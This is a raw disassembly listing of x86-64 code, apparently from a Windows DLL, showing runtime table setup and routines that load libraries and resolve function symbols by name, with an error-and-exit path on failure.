    69684529:	48 8d 15 30 0f 10 00 	lea    0x100f30(%rip),%rdx        # 0x69785460
    69684530:	48 89 0d 49 0f 10 00 	mov    %rcx,0x100f49(%rip)        # 0x69785480
    69684537:	48 8d 0d 31 26 00 00 	lea    0x2631(%rip),%rcx        # 0x69686b6f
    6968453e:	48 89 05 53 83 10 00 	mov    %rax,0x108353(%rip)        # 0x6978c898
    69684545:	48 8d 05 61 26 00 00 	lea    0x2661(%rip),%rax        # 0x69686bad
    6968454c:	c6 05 7d 4e 0f 00 01 	movb   $0x1,0xf4e7d(%rip)        # 0x697793d0
    69684553:	48 c7 05 7a 4e 0f 00 	movq   $0x30,0xf4e7a(%rip)        # 0x697793d8
    6968455a:	30 00 00 00 
    6968455e:	48 c7 05 97 82 10 00 	movq   $0x8,0x108297(%rip)        # 0x6978c800
    69684565:	08 00 00 00 
    69684569:	48 c7 05 94 82 10 00 	movq   $0x8,0x108294(%rip)        # 0x6978c808
    69684570:	08 00 00 00 
    69684574:	c6 05 95 82 10 00 16 	movb   $0x16,0x108295(%rip)        # 0x6978c810
    6968457b:	48 89 15 96 82 10 00 	mov    %rdx,0x108296(%rip)        # 0x6978c818
    69684582:	48 89 0d a7 82 10 00 	mov    %rcx,0x1082a7(%rip)        # 0x6978c830
    69684589:	48 c7 05 04 0e 10 00 	movq   $0x0,0x100e04(%rip)        # 0x69785398
    69684590:	00 00 00 00 
    69684594:	48 c7 05 e1 0d 10 00 	movq   $0x2,0x100de1(%rip)        # 0x69785380
    6968459b:	02 00 00 00 
    6968459f:	48 c7 05 de 0d 10 00 	movq   $0x2,0x100dde(%rip)        # 0x69785388
    696845a6:	02 00 00 00 
    696845aa:	66 c7 05 dd 0d 10 00 	movw   $0x321,0x100ddd(%rip)        # 0x69785390
    696845b1:	21 03 
    696845b3:	48 c7 05 02 0f 10 00 	movq   $0x30,0x100f02(%rip)        # 0x697854c0
    696845ba:	30 00 00 00 
    696845be:	48 c7 05 ff 0e 10 00 	movq   $0x8,0x100eff(%rip)        # 0x697854c8
    696845c5:	08 00 00 00 
    696845c9:	c6 05 00 0f 10 00 11 	movb   $0x11,0x100f00(%rip)        # 0x697854d0
    696845d0:	48 c7 05 45 4e 0f 00 	movq   $0x0,0xf4e45(%rip)        # 0x69779420
    696845d7:	00 00 00 00 
    696845db:	c6 05 1e 4e 0f 00 02 	movb   $0x2,0xf4e1e(%rip)        # 0x69779400
    696845e2:	48 c7 05 93 82 10 00 	movq   $0x8,0x108293(%rip)        # 0x6978c880
    696845e9:	08 00 00 00 
    696845ed:	48 c7 05 90 82 10 00 	movq   $0x8,0x108290(%rip)        # 0x6978c888
    696845f4:	08 00 00 00 
    696845f8:	c6 05 91 82 10 00 16 	movb   $0x16,0x108291(%rip)        # 0x6978c890
    696845ff:	48 89 05 aa 82 10 00 	mov    %rax,0x1082aa(%rip)        # 0x6978c8b0
    69684606:	c3                   	ret
    69684607:	48 83 ec 28          	sub    $0x28,%rsp
    6968460b:	48 8b 05 de 0a 10 00 	mov    0x100ade(%rip),%rax        # 0x697850f0
    69684612:	48 3d ab 0d 00 00    	cmp    $0xdab,%rax
    69684618:	7e 24                	jle    0x6968463e
    6968461a:	b9 02 00 00 00       	mov    $0x2,%ecx
    6968461f:	ff 15 cb 8a 00 00    	call   *0x8acb(%rip)        # 0x6968d0f0
    69684625:	48 8d 15 c0 9b 00 00 	lea    0x9bc0(%rip),%rdx        # 0x6968e1ec
    6968462c:	48 89 c1             	mov    %rax,%rcx
    6968462f:	e8 f2 d3 ff ff       	call   0x69681a26
    69684634:	b9 01 00 00 00       	mov    $0x1,%ecx
    69684639:	e8 02 80 00 00       	call   0x6968c640
    6968463e:	48 8d 15 bb 0f 10 00 	lea    0x100fbb(%rip),%rdx        # 0x69785600
    69684645:	48 89 0c c2          	mov    %rcx,(%rdx,%rax,8)
    69684649:	48 ff c0             	inc    %rax
    6968464c:	48 89 05 9d 0a 10 00 	mov    %rax,0x100a9d(%rip)        # 0x697850f0
    69684653:	48 83 c4 28          	add    $0x28,%rsp
    69684657:	c3                   	ret
    69684658:	56                   	push   %rsi
    69684659:	53                   	push   %rbx
    6968465a:	48 83 ec 28          	sub    $0x28,%rsp
    6968465e:	48 8b 1d 8b 8a 00 00 	mov    0x8a8b(%rip),%rbx        # 0x6968d0f0
    69684665:	48 89 ce             	mov    %rcx,%rsi
    69684668:	b9 02 00 00 00       	mov    $0x2,%ecx
    6968466d:	ff d3                	call   *%rbx
    6968466f:	48 8d 15 b6 9b 00 00 	lea    0x9bb6(%rip),%rdx        # 0x6968e22c
    69684676:	48 89 c1             	mov    %rax,%rcx
    69684679:	e8 a8 d3 ff ff       	call   0x69681a26
    6968467e:	b9 02 00 00 00       	mov    $0x2,%ecx
    69684683:	ff d3                	call   *%rbx
    69684685:	48 89 f2             	mov    %rsi,%rdx
    69684688:	48 89 c1             	mov    %rax,%rcx
    6968468b:	e8 96 d3 ff ff       	call   0x69681a26
    69684690:	b9 02 00 00 00       	mov    $0x2,%ecx
    69684695:	ff d3                	call   *%rbx
    69684697:	48 8d 15 5c 9a 00 00 	lea    0x9a5c(%rip),%rdx        # 0x6968e0fa
    6968469e:	48 89 c1             	mov    %rax,%rcx
    696846a1:	e8 80 d3 ff ff       	call   0x69681a26
    696846a6:	b9 01 00 00 00       	mov    $0x1,%ecx
    696846ab:	e8 90 7f 00 00       	call   0x6968c640
    696846b0:	90                   	nop
    696846b1:	41 56                	push   %r14
    696846b3:	41 55                	push   %r13
    696846b5:	41 54                	push   %r12
    696846b7:	55                   	push   %rbp
    696846b8:	57                   	push   %rdi
    696846b9:	56                   	push   %rsi
    696846ba:	53                   	push   %rbx
    696846bb:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
    696846c2:	4c 8b 2d 53 9b 10 00 	mov    0x109b53(%rip),%r13        # 0x6978e21c
    696846c9:	49 89 cc             	mov    %rcx,%r12
    696846cc:	48 89 d5             	mov    %rdx,%rbp
    696846cf:	41 ff d5             	call   *%r13
    696846d2:	48 85 c0             	test   %rax,%rax
    696846d5:	0f 85 b2 00 00 00    	jne    0x6968478d
    696846db:	48 8d 7c 24 26       	lea    0x26(%rsp),%rdi
    696846e0:	ba fa 00 00 00       	mov    $0xfa,%edx
    696846e5:	bb 01 00 00 00       	mov    $0x1,%ebx
    696846ea:	48 89 f9             	mov    %rdi,%rcx
    696846ed:	e8 da d2 ff ff       	call   0x696819cc
    696846f2:	c6 44 24 26 5f       	movb   $0x5f,0x26(%rsp)
    696846f7:	8a 44 1d ff          	mov    -0x1(%rbp,%rbx,1),%al
    696846fb:	84 c0                	test   %al,%al
    696846fd:	74 0f                	je     0x6968470e
    696846ff:	88 04 1f             	mov    %al,(%rdi,%rbx,1)
    69684702:	48 ff c3             	inc    %rbx
    69684705:	48 81 fb f5 00 00 00 	cmp    $0xf5,%rbx
    6968470c:	75 e9                	jne    0x696846f7
    6968470e:	c6 44 1c 26 40       	movb   $0x40,0x26(%rsp,%rbx,1)
    69684713:	be 63 00 00 00       	mov    $0x63,%esi
    69684718:	41 be 0a 00 00 00    	mov    $0xa,%r14d
    6968471e:	48 8d 4e 9d          	lea    -0x63(%rsi),%rcx
    69684722:	48 81 fe c6 00 00 00 	cmp    $0xc6,%rsi
    69684729:	76 06                	jbe    0x69684731
    6968472b:	48 83 c3 03          	add    $0x3,%rbx
    6968472f:	eb 13                	jmp    0x69684744
    69684731:	48 8d 46 a6          	lea    -0x5a(%rsi),%rax
    69684735:	48 83 f8 12          	cmp    $0x12,%rax
    69684739:	76 06                	jbe    0x69684741
    6968473b:	48 83 c3 02          	add    $0x2,%rbx
    6968473f:	eb 03                	jmp    0x69684744
    69684741:	48 ff c3             	inc    %rbx
    69684744:	c6 44 1c 27 00       	movb   $0x0,0x27(%rsp,%rbx,1)
    69684749:	48 89 c8             	mov    %rcx,%rax
    6968474c:	31 d2                	xor    %edx,%edx
    6968474e:	49 f7 f6             	div    %r14
    69684751:	48 89 c8             	mov    %rcx,%rax
    69684754:	83 c2 30             	add    $0x30,%edx
    69684757:	88 14 1f             	mov    %dl,(%rdi,%rbx,1)
    6968475a:	48 99                	cqto
    6968475c:	48 ff cb             	dec    %rbx
    6968475f:	49 f7 fe             	idiv   %r14
    69684762:	48 85 c0             	test   %rax,%rax
    69684765:	48 89 c1             	mov    %rax,%rcx
    69684768:	75 df                	jne    0x69684749
    6968476a:	48 89 fa             	mov    %rdi,%rdx
    6968476d:	4c 89 e1             	mov    %r12,%rcx
    69684770:	41 ff d5             	call   *%r13
    69684773:	48 85 c0             	test   %rax,%rax
    69684776:	75 15                	jne    0x6968478d
    69684778:	48 83 c6 04          	add    $0x4,%rsi
    6968477c:	48 81 fe 2f 01 00 00 	cmp    $0x12f,%rsi
    69684783:	75 99                	jne    0x6968471e
    69684785:	48 89 e9             	mov    %rbp,%rcx
    69684788:	e8 cb fe ff ff       	call   0x69684658
    6968478d:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
    69684794:	5b                   	pop    %rbx
    69684795:	5e                   	pop    %rsi
    69684796:	5f                   	pop    %rdi
    69684797:	5d                   	pop    %rbp
    69684798:	41 5c                	pop    %r12
    6968479a:	41 5d                	pop    %r13
    6968479c:	41 5e                	pop    %r14
    6968479e:	c3                   	ret
    6968479f:	56                   	push   %rsi
    696847a0:	53                   	push   %rbx
    696847a1:	48 83 ec 28          	sub    $0x28,%rsp
    696847a5:	48 8b 1d 44 89 00 00 	mov    0x8944(%rip),%rbx        # 0x6968d0f0
    696847ac:	48 89 ce             	mov    %rcx,%rsi
    696847af:	b9 02 00 00 00       	mov    $0x2,%ecx
    696847b4:	ff d3                	call   *%rbx
    696847b6:	48 8d 15 82 9a 00 00 	lea    0x9a82(%rip),%rdx        # 0x6968e23f
    696847bd:	48 89 c1             	mov    %rax,%rcx
    696847c0:	e8 61 d2 ff ff       	call   0x69681a26
    696847c5:	48 89 f1             	mov    %rsi,%rcx
    696847c8:	e8 31 d1 ff ff       	call   0x696818fe
    696847cd:	b9 02 00 00 00       	mov    $0x2,%ecx
    696847d2:	48 89 c6             	mov    %rax,%rsi
    696847d5:	ff d3                	call   *%rbx
    696847d7:	48 89 f2             	mov    %rsi,%rdx
    696847da:	48 89 c1             	mov    %rax,%rcx
    696847dd:	e8 44 d2 ff ff       	call   0x69681a26
    696847e2:	ff 15 2c 9a 10 00    	call   *0x109a2c(%rip)        # 0x6978e214
    696847e8:	3d c1 00 00 00       	cmp    $0xc1,%eax
    696847ed:	75 16                	jne    0x69684805
    696847ef:	b9 02 00 00 00       	mov    $0x2,%ecx
    696847f4:	ff d3                	call   *%rbx
    696847f6:	48 8d 15 53 9a 00 00 	lea    0x9a53(%rip),%rdx        # 0x6968e250
    696847fd:	48 89 c1             	mov    %rax,%rcx
    69684800:	e8 21 d2 ff ff       	call   0x69681a26
    69684805:	b9 02 00 00 00       	mov    $0x2,%ecx
    6968480a:	ff d3                	call   *%rbx
    6968480c:	48 8d 15 e7 98 00 00 	lea    0x98e7(%rip),%rdx        # 0x6968e0fa
    69684813:	48 89 c1             	mov    %rax,%rcx
    69684816:	e8 0b d2 ff ff       	call   0x69681a26
    6968481b:	b9 01 00 00 00       	mov    $0x1,%ecx
    69684820:	e8 1b 7e 00 00       	call   0x6968c640
    69684825:	90                   	nop
    69684826:	48 83 ec 28          	sub    $0x28,%rsp
    6968482a:	e8 cf d0 ff ff       	call   0x696818fe
    6968482f:	48 89 c1             	mov    %rax,%rcx
    69684832:	48 83 c4 28          	add    $0x28,%rsp
    69684836:	48 ff 25 07 9a 10 00 	rex.W jmp *0x109a07(%rip)        # 0x6978e244
    6968483d:	48 83 ec 28          	sub    $0x28,%rsp
    69684841:	48 8d 05 e8 56 0f 00 	lea    0xf56e8(%rip),%rax        # 0x69779f30
    69684848:	c6 05 81 0a 10 00 12 	movb   $0x12,0x100a81(%rip)        # 0x697852d0
    6968484f:	48 89 05 aa 57 0f 00 	mov    %rax,0xf57aa(%rip)        # 0x6977a000
    69684856:	48 8d 15 24 9a 00 00 	lea    0x9a24(%rip),%rdx        # 0x6968e281
    6968485d:	48 8d 05 5c 7c 10 00 	lea    0x107c5c(%rip),%rax        # 0x6978c4c0
    69684864:	48 89 15 dd 56 0f 00 	mov    %rdx,0xf56dd(%rip)        # 0x69779f48
    6968486b:	48 89 05 ce 56 0f 00 	mov    %rax,0xf56ce(%rip)        # 0x69779f40
    69684872:	48 8d 15 e7 56 0f 00 	lea    0xf56e7(%rip),%rdx        # 0x69779f60
    69684879:	48 89 05 f0 56 0f 00 	mov    %rax,0xf56f0(%rip)        # 0x69779f70
    69684880:	48 8d 05 fc 99 00 00 	lea    0x99fc(%rip),%rax        # 0x6968e283
    69684887:	48 89 05 ea 56 0f 00 	mov    %rax,0xf56ea(%rip)        # 0x69779f78
    6968488e:	48 8d 42 30          	lea    0x30(%rdx),%rax
    69684892:	48 89 05 77 57 0f 00 	mov    %rax,0xf5777(%rip)        # 0x6977a010
    69684899:	48 8d 05 a0 80 10 00 	lea    0x1080a0(%rip),%rax        # 0x6978c940
    696848a0:	48 89 05 f9 56 0f 00 	mov    %rax,0xf56f9(%rip)        # 0x69779fa0
    696848a7:	48 8d 0d 12 57 0f 00 	lea    0xf5712(%rip),%rcx        # 0x69779fc0
    696848ae:	48 89 05 1b 57 0f 00 	mov    %rax,0xf571b(%rip)        # 0x69779fd0
    696848b5:	48 8d 05 ce 99 00 00 	lea    0x99ce(%rip),%rax        # 0x6968e28a
    696848bc:	48 89 05 15 57 0f 00 	mov    %rax,0xf5715(%rip)        # 0x69779fd8
    696848c3:	48 8d 05 36 57 0f 00 	lea    0xf5736(%rip),%rax        # 0x6977a000
    696848ca:	48 89 05 57 56 0f 00 	mov    %rax,0xf5657(%rip)        # 0x69779f28
    696848d1:	48 8d 81 40 ff ff ff 	lea    -0xc0(%rcx),%rax
    696848d8:	48 89 05 01 0a 10 00 	mov    %rax,0x100a01(%rip)        # 0x697852e0
    696848df:	48 8d 05 da 09 10 00 	lea    0x1009da(%rip),%rax        # 0x697852c0
    696848e6:	48 89 15 1b 57 0f 00 	mov    %rdx,0xf571b(%rip)        # 0x6977a008
    696848ed:	48 8d 15 91 99 00 00 	lea    0x9991(%rip),%rdx        # 0x6968e285
    696848f4:	48 89 05 5d 80 10 00 	mov    %rax,0x10805d(%rip)        # 0x6978c958
    696848fb:	48 8d 05 a5 20 00 00 	lea    0x20a5(%rip),%rax        # 0x696869a7
    69684902:	48 89 15 9f 56 0f 00 	mov    %rdx,0xf569f(%rip)        # 0x69779fa8
    69684909:	48 89 0d 08 57 0f 00 	mov    %rcx,0xf5708(%rip)        # 0x6977a018
    69684910:	48 8d 0d 89 0f 0f 00 	lea    0xf0f89(%rip),%rcx        # 0x697758a0
    69684917:	48 c7 05 9e 09 10 00 	movq   $0x18,0x10099e(%rip)        # 0x697852c0
    6968491e:	18 00 00 00 
    69684922:	48 c7 05 9b 09 10 00 	movq   $0x8,0x10099b(%rip)        # 0x697852c8
    69684929:	08 00 00 00 
    6968492d:	48 c7 05 a0 09 10 00 	movq   $0x0,0x1009a0(%rip)        # 0x697852d8
    69684934:	00 00 00 00 
    69684938:	c6 05 f1 55 0f 00 01 	movb   $0x1,0xf55f1(%rip)        # 0x69779f30
    6968493f:	48 c7 05 ee 55 0f 00 	movq   $0x0,0xf55ee(%rip)        # 0x69779f38
    69684946:	00 00 00 00 
    6968494a:	c6 05 0f 56 0f 00 01 	movb   $0x1,0xf560f(%rip)        # 0x69779f60
    69684951:	48 c7 05 0c 56 0f 00 	movq   $0x4,0xf560c(%rip)        # 0x69779f68
    69684958:	04 00 00 00 
    6968495c:	c6 05 2d 56 0f 00 01 	movb   $0x1,0xf562d(%rip)        # 0x69779f90
    69684963:	48 c7 05 2a 56 0f 00 	movq   $0x8,0xf562a(%rip)        # 0x69779f98
    6968496a:	08 00 00 00 
    6968496e:	c6 05 4b 56 0f 00 01 	movb   $0x1,0xf564b(%rip)        # 0x69779fc0
    69684975:	48 c7 05 48 56 0f 00 	movq   $0x10,0xf5648(%rip)        # 0x69779fc8
    6968497c:	10 00 00 00 
    69684980:	48 c7 05 95 55 0f 00 	movq   $0x4,0xf5595(%rip)        # 0x69779f20
    69684987:	04 00 00 00 
    6968498b:	c6 05 6e 55 0f 00 02 	movb   $0x2,0xf556e(%rip)        # 0x69779f00
    69684992:	48 c7 05 a3 7f 10 00 	movq   $0x8,0x107fa3(%rip)        # 0x6978c940
    69684999:	08 00 00 00 
    6968499d:	48 c7 05 a0 7f 10 00 	movq   $0x8,0x107fa0(%rip)        # 0x6978c948
    696849a4:	08 00 00 00 
    696849a8:	c6 05 a1 7f 10 00 16 	movb   $0x16,0x107fa1(%rip)        # 0x6978c950
    696849af:	48 89 05 ba 7f 10 00 	mov    %rax,0x107fba(%rip)        # 0x6978c970
    696849b6:	48 8d 05 a3 cf 0f 00 	lea    0xfcfa3(%rip),%rax        # 0x69781960
    696849bd:	48 89 05 54 cf 0f 00 	mov    %rax,0xfcf54(%rip)        # 0x69781918
    696849c4:	48 8d 05 32 cf ff ff 	lea    -0x30ce(%rip),%rax        # 0x696818fd
    696849cb:	48 c7 05 2a cf 0f 00 	movq   $0x8,0xfcf2a(%rip)        # 0x69781900
    696849d2:	08 00 00 00 
    696849d6:	48 c7 05 27 cf 0f 00 	movq   $0x8,0xfcf27(%rip)        # 0x69781908
    696849dd:	08 00 00 00 
    696849e1:	c6 05 28 cf 0f 00 18 	movb   $0x18,0xfcf28(%rip)        # 0x69781910
    696849e8:	48 89 05 41 cf 0f 00 	mov    %rax,0xfcf41(%rip)        # 0x69781930
    696849ef:	e8 32 fe ff ff       	call   0x69684826
    696849f4:	48 8d 0d 85 0e 0f 00 	lea    0xf0e85(%rip),%rcx        # 0x69775880
    696849fb:	48 85 c0             	test   %rax,%rax
    696849fe:	48 89 05 e3 54 0f 00 	mov    %rax,0xf54e3(%rip)        # 0x69779ee8
    69684a05:	74 35                	je     0x69684a3c
    69684a07:	48 8d 15 82 98 00 00 	lea    0x9882(%rip),%rdx        # 0x6968e290
    69684a0e:	48 89 c1             	mov    %rax,%rcx
    69684a11:	e8 9b fc ff ff       	call   0x696846b1
    69684a16:	48 8d 0d 43 0e 0f 00 	lea    0xf0e43(%rip),%rcx        # 0x69775860
    69684a1d:	48 89 05 5c 7f 10 00 	mov    %rax,0x107f5c(%rip)        # 0x6978c980
    69684a24:	e8 fd fd ff ff       	call   0x69684826
    69684a29:	48 85 c0             	test   %rax,%rax
    69684a2c:	48 89 05 ad 54 0f 00 	mov    %rax,0xf54ad(%rip)        # 0x69779ee0
    69684a33:	75 0c                	jne    0x69684a41
    69684a35:	48 8d 0d 04 0e 0f 00 	lea    0xf0e04(%rip),%rcx        # 0x69775840
    69684a3c:	e8 5e fd ff ff       	call   0x6968479f
    69684a41:	48 8d 15 59 98 00 00 	lea    0x9859(%rip),%rdx        # 0x6968e2a1
    69684a48:	48 89 c1             	mov    %rax,%rcx
    69684a4b:	e8 61 fc ff ff       	call   0x696846b1
    69684a50:	48 89 05 81 09 10 00 	mov    %rax,0x100981(%rip)        # 0x697853d8
    69684a57:	48 83 c4 28          	add    $0x28,%rsp
    69684a5b:	c3                   	ret
    69684a5c:	48 83 ec 28          	sub    $0x28,%rsp
    69684a60:	48 8d 0d f9 a2 00 00 	lea    0xa2f9(%rip),%rcx        # 0x6968ed60
    69684a67:	e8 ba fd ff ff       	call   0x69684826
    69684a6c:	48 85 c0             	test   %rax,%rax
    69684a6f:	48 89 05 22 4d 0f 00 	mov    %rax,0xf4d22(%rip)        # 0x69779798
    69684a76:	75 0c                	jne    0x69684a84
    69684a78:	48 8d 0d c1 a2 00 00 	lea    0xa2c1(%rip),%rcx        # 0x6968ed40
    69684a7f:	e8 1b fd ff ff       	call   0x6968479f
    69684a84:	48 8d 15 25 98 00 00 	lea    0x9825(%rip),%rdx        # 0x6968e2b0
    69684a8b:	48 89 c1             	mov    %rax,%rcx
    69684a8e:	e8 1e fc ff ff       	call   0x696846b1
    69684a93:	48 89 05 26 7c 10 00 	mov    %rax,0x107c26(%rip)        # 0x6978c6c0
    69684a9a:	48 83 c4 28          	add    $0x28,%rsp
    69684a9e:	c3                   	ret
    69684a9f:	48 83 ec 28          	sub    $0x28,%rsp
    69684aa3:	48 8d 0d f6 a1 00 00 	lea    0xa1f6(%rip),%rcx        # 0x6968eca0
    69684aaa:	e8 77 fd ff ff       	call   0x69684826
    69684aaf:	48 85 c0             	test   %rax,%rax
    69684ab2:	48 89 05 d7 4c 0f 00 	mov    %rax,0xf4cd7(%rip)        # 0x69779790
    69684ab9:	75 0c                	jne    0x69684ac7
    69684abb:	48 8d 0d be a1 00 00 	lea    0xa1be(%rip),%rcx        # 0x6968ec80
    69684ac2:	e8 d8 fc ff ff       	call   0x6968479f
    69684ac7:	48 8d 15 f2 97 00 00 	lea    0x97f2(%rip),%rdx        # 0x6968e2c0
    69684ace:	48 89 c1             	mov    %rax,%rcx
    69684ad1:	e8 db fb ff ff       	call   0x696846b1
    69684ad6:	48 89 05 a3 00 10 00 	mov    %rax,0x1000a3(%rip)        # 0x69784b80
    69684add:	48 83 c4 28          	add    $0x28,%rsp
    69684ae1:	c3                   	ret
    69684ae2:	48 83 ec 28          	sub    $0x28,%rsp
    69684ae6:	48 8d 0d 53 a0 00 00 	lea    0xa053(%rip),%rcx        # 0x6968eb40
    69684aed:	e8 34 fd ff ff       	call   0x69684826
    69684af2:	48 85 c0             	test   %rax,%rax
    69684af5:	48 89 05 44 49 0f 00 	mov    %rax,0xf4944(%rip)        # 0x69779440
    69684afc:	75 0c                	jne    0x69684b0a
    69684afe:	48 8d 0d 1b a0 00 00 	lea    0xa01b(%rip),%rcx        # 0x6968eb20
    69684b05:	e8 95 fc ff ff       	call   0x6968479f
    69684b0a:	48 8d 15 b9 97 00 00 	lea    0x97b9(%rip),%rdx        # 0x6968e2ca
    69684b11:	48 89 c1             	mov    %rax,%rcx
    69684b14:	e8 98 fb ff ff       	call   0x696846b1
    69684b19:	48 8b 0d 20 49 0f 00 	mov    0xf4920(%rip),%rcx        # 0x69779440
    69684b20:	48 8d 15 bb 97 00 00 	lea    0x97bb(%rip),%rdx        # 0x6968e2e2
    69684b27:	48 89 05 02 7e 10 00 	mov    %rax,0x107e02(%rip)        # 0x6978c930
    69684b2e:	e8 7e fb ff ff       	call   0x696846b1
    69684b33:	48 8b 0d 06 49 0f 00 	mov    0xf4906(%rip),%rcx        # 0x69779440
    69684b3a:	48 8d 15 ac 97 00 00 	lea    0x97ac(%rip),%rdx        # 0x6968e2ed
    69684b41:	48 89 05 b8 7a 10 00 	mov    %rax,0x107ab8(%rip)        # 0x6978c600
    69684b48:	e8 64 fb ff ff       	call   0x696846b1
    69684b4d:	48 8b 0d ec 48 0f 00 	mov    0xf48ec(%rip),%rcx        # 0x69779440
    69684b54:	48 8d 15 a1 97 00 00 	lea    0x97a1(%rip),%rdx        # 0x6968e2fc
    69684b5b:	48 89 05 06 7b 10 00 	mov    %rax,0x107b06(%rip)        # 0x6978c668
    69684b62:	e8 4a fb ff ff       	call   0x696846b1
    69684b67:	48 8b 0d d2 48 0f 00 	mov    0xf48d2(%rip),%rcx        # 0x69779440
    69684b6e:	48 8d 15 91 97 00 00 	lea    0x9791(%rip),%rdx        # 0x6968e306
    69684b75:	48 89 05 8c fd 0f 00 	mov    %rax,0xffd8c(%rip)        # 0x69784908
    69684b7c:	e8 30 fb ff ff       	call   0x696846b1
    69684b81:	48 8b 0d b8 48 0f 00 	mov    0xf48b8(%rip),%rcx        # 0x69779440
    69684b88:	48 8d 15 84 97 00 00 	lea    0x9784(%rip),%rdx        # 0x6968e313
    69684b8f:	48 89 05 ea 7b 10 00 	mov    %rax,0x107bea(%rip)        # 0x6978c780
    69684b96:	e8 16 fb ff ff       	call   0x696846b1
    69684b9b:	48 8b 0d 9e 48 0f 00 	mov    0xf489e(%rip),%rcx        # 0x69779440
    69684ba2:	48 8d 15 7f 97 00 00 	lea    0x977f(%rip),%rdx        # 0x6968e328
    69684ba9:	48 89 05 78 7d 10 00 	mov    %rax,0x107d78(%rip)        # 0x6978c928
    69684bb0:	e8 fc fa ff ff       	call   0x696846b1
    69684bb5:	48 8b 0d 84 48 0f 00 	mov    0xf4884(%rip),%rcx        # 0x69779440
    69684bbc:	48 8d 15 76 97 00 00 	lea    0x9776(%rip),%rdx        # 0x6968e339
    69684bc3:	48 89 05 f6 07 10 00 	mov    %rax,0x1007f6(%rip)        # 0x697853c0
    69684bca:	e8 e2 fa ff ff       	call   0x696846b1
    69684bcf:	48 8b 0d 6a 48 0f 00 	mov    0xf486a(%rip),%rcx        # 0x69779440
    69684bd6:	48 8d 15 68 97 00 00 	lea    0x9768(%rip),%rdx        # 0x6968e345
    69684bdd:	48 89 05 44 5f 0f 00 	mov    %rax,0xf5f44(%rip)        # 0x6977ab28
    69684be4:	e8 c8 fa ff ff       	call   0x696846b1
    69684be9:	48 8b 0d 50 48 0f 00 	mov    0xf4850(%rip),%rcx        # 0x69779440
    69684bf0:	48 8d 15 60 97 00 00 	lea    0x9760(%rip),%rdx        # 0x6968e357
    69684bf7:	48 89 05 62 fd 0f 00 	mov    %rax,0xffd62(%rip)        # 0x69784960
    69684bfe:	e8 ae fa ff ff       	call   0x696846b1
    69684c03:	48 8b 0d 36 48 0f 00 	mov    0xf4836(%rip),%rcx        # 0x69779440
    69684c0a:	48 8d 15 56 97 00 00 	lea    0x9756(%rip),%rdx        # 0x6968e367
    69684c11:	48 89 05 d0 cd 0f 00 	mov    %rax,0xfcdd0(%rip)        # 0x697819e8
    69684c18:	e8 94 fa ff ff       	call   0x696846b1
    69684c1d:	48 8b 0d 1c 48 0f 00 	mov    0xf481c(%rip),%rcx        # 0x69779440
    69684c24:	48 8d 15 48 97 00 00 	lea    0x9748(%rip),%rdx        # 0x6968e373
    69684c2b:	48 89 05 96 79 10 00 	mov    %rax,0x107996(%rip)        # 0x6978c5c8
    69684c32:	e8 7a fa ff ff       	call   0x696846b1
    69684c37:	48 8b 0d 02 48 0f 00 	mov    0xf4802(%rip),%rcx        # 0x69779440
    69684c3e:	48 8d 15 3b 97 00 00 	lea    0x973b(%rip),%rdx        # 0x6968e380
    69684c45:	48 89 05 bc 08 10 00 	mov    %rax,0x1008bc(%rip)        # 0x69785508
    69684c4c:	e8 60 fa ff ff       	call   0x696846b1
    69684c51:	48 8b 0d e8 47 0f 00 	mov    0xf47e8(%rip),%rcx        # 0x69779440
    69684c58:	48 8d 15 30 97 00 00 	lea    0x9730(%rip),%rdx        # 0x6968e38f
    69684c5f:	48 89 05 6a 7c 10 00 	mov    %rax,0x107c6a(%rip)        # 0x6978c8d0
    69684c66:	e8 46 fa ff ff       	call   0x696846b1
    69684c6b:	48 89 05 7e 09 10 00 	mov    %rax,0x10097e(%rip)        # 0x697855f0
    69684c72:	48 83 c4 28          	add    $0x28,%rsp
    69684c76:	c3                   	ret
    69684c77:	48 83 ec 28          	sub    $0x28,%rsp
    69684c7b:	48 8d 0d 5e 9e 00 00 	lea    0x9e5e(%rip),%rcx        # 0x6968eae0
    69684c82:	e8 9f fb ff ff       	call   0x69684826
    69684c87:	48 85 c0             	test   %rax,%rax
    69684c8a:	48 89 05 a7 47 0f 00 	mov    %rax,0xf47a7(%rip)        # 0x69779438
    69684c91:	75 0c                	jne    0x69684c9f
    69684c93:	48 8d 0d 26 9e 00 00 	lea    0x9e26(%rip),%rcx        # 0x6968eac0
    69684c9a:	e8 00 fb ff ff       	call   0x6968479f
    69684c9f:	48 8d 15 f7 96 00 00 	lea    0x96f7(%rip),%rdx        # 0x6968e39d
    69684ca6:	48 89 c1             	mov    %rax,%rcx
    69684ca9:	e8 03 fa ff ff       	call   0x696846b1
    69684cae:	48 8b 0d 83 47 0f 00 	mov    0xf4783(%rip),%rcx        # 0x69779438
    69684cb5:	48 8d 15 ee 96 00 00 	lea    0x96ee(%rip),%rdx        # 0x6968e3aa
    69684cbc:	48 89 05 25 09 10 00 	mov    %rax,0x100925(%rip)        # 0x697855e8
    69684cc3:	e8 e9 f9 ff ff       	call   0x696846b1
    69684cc8:	48 8b 0d 69 47 0f 00 	mov    0xf4769(%rip),%rcx        # 0x69779438
    69684ccf:	48 8d 15 e3 96 00 00 	lea    0x96e3(%rip),%rdx        # 0x6968e3b9
    69684cd6:	48 89 05 43 7a 10 00 	mov    %rax,0x107a43(%rip)        # 0x6978c720
    69684cdd:	e8 cf f9 ff ff       	call   0x696846b1
    69684ce2:	48 8b 0d 4f 47 0f 00 	mov    0xf474f(%rip),%rcx        # 0x69779438
    69684ce9:	48 8d 15 d3 96 00 00 	lea    0x96d3(%rip),%rdx        # 0x6968e3c3
    69684cf0:	48 89 05 09 08 10 00 	mov    %rax,0x100809(%rip)        # 0x69785500
    69684cf7:	e8 b5 f9 ff ff       	call   0x696846b1
    69684cfc:	48 8b 0d 35 47 0f 00 	mov    0xf4735(%rip),%rcx        # 0x69779438
    69684d03:	48 8d 15 c8 96 00 00 	lea    0x96c8(%rip),%rdx        # 0x6968e3d2
    69684d0a:	48 89 05 c7 f8 0f 00 	mov    %rax,0xff8c7(%rip)        # 0x697845d8
    69684d11:	e8 9b f9 ff ff       	call   0x696846b1
    69684d16:	48 8b 0d 1b 47 0f 00 	mov    0xf471b(%rip),%rcx        # 0x69779438
    69684d1d:	48 8d 15 e2 95 00 00 	lea    0x95e2(%rip),%rdx        # 0x6968e306
    69684d24:	48 89 05 a5 06 10 00 	mov    %rax,0x1006a5(%rip)        # 0x697853d0
    69684d2b:	e8 81 f9 ff ff       	call   0x696846b1
